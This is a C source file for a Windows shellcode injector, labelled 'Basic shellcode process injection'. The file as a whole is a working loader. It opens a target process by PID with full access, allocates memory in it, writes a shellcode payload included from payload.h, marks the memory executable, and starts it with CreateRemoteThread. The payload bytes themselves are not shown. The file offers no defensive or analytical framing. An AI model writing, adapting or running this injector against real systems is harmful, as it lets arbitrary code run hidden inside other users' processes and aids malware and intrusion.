/*
 * no-obfuscation.c
 *
 * Basic shellcode process injection 
 *
 */

#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "payload.h"

int main( int argc, char *argv[] )
{
    if( argc < 2 )
    {
        return;
    }

    HANDLE process_snapshot;
    HANDLE target_process = NULL;
    PROCESSENTRY32 current_process;
    DWORD process_id = atoi( argv[1] );

    //
    // ENUMERATE RUNNING PROCESSES TO ENSURE PID IS VALID
    //
    process_snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if( NULL == process_snapshot )
    {
        return 1;
    }

    current_process.dwSize = sizeof( PROCESSENTRY32 );
    Process32First( process_snapshot, &current_process );

    do
    {   
        // printf( "process id = %d\n", current_process.th32ProcessID );
        if( process_id == current_process.th32ProcessID )
        {
            target_process = OpenProcess( PROCESS_ALL_ACCESS, TRUE, current_process.th32ProcessID );
            break;
        }
    }

    while( Process32Next(process_snapshot, &current_process) );

    CloseHandle( process_snapshot );

    if( NULL == target_process )
    {
        // printf( "[!] Could not find target or OpenProcess() failed!\n" );
        return 1;
    }

    // printf( "[+] Handle to target has been achieved!\n" );

    //
    // ALLOCATE MEMORY IN TARGET PROCESS
    //
    size_t payload_size = sizeof( payload );
    LPVOID target_process_allocated_memory = NULL;
    
    target_process_allocated_memory = VirtualAllocEx( target_process, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if( NULL == target_process_allocated_memory )
    {
        // printf( "[!] Could not allocate memory!\n" );
        return 1;
    }

    // printf( "[+] Successfully allocated memory!\n" );

    //
    // WRITE TO ALLOCATED MEMORY
    //
    BOOL return_check = FALSE;

    return_check = WriteProcessMemory( target_process, target_process_allocated_memory, payload, payload_size, NULL );

    if( FALSE == return_check )
    {
        // printf( "[+] WriteProcessMemory returned false!\n" );
        return 1;
    }

    //
    // UPDATE PERMISSIONS TO ALLOW EXECUTION
    //
    DWORD old_protect = NULL;
    return_check = VirtualProtectEx( target_process, target_process_allocated_memory, payload_size, PAGE_EXECUTE_READWRITE, &old_protect );

    if( FALSE == return_check )
    {
        // printf( "[!] VirtualProtectEx() returned false! Error code: %d\n", GetLastError() );
        return 1;
    }

    //
    // EXECUTED SHELLCODE IN ALLOCATED MEMORY
    //
    HANDLE handle_remote_thread = NULL;

    handle_remote_thread = CreateRemoteThread( target_process, NULL, 0, target_process_allocated_memory, NULL, 0, NULL );

    if( NULL == handle_remote_thread )
    {
        // printf( "[!] CreateRemoteThread() failed!\n" );
        return 1;
    }

    // printf( "[+] Executed payload!\n" );
    return 0;
}
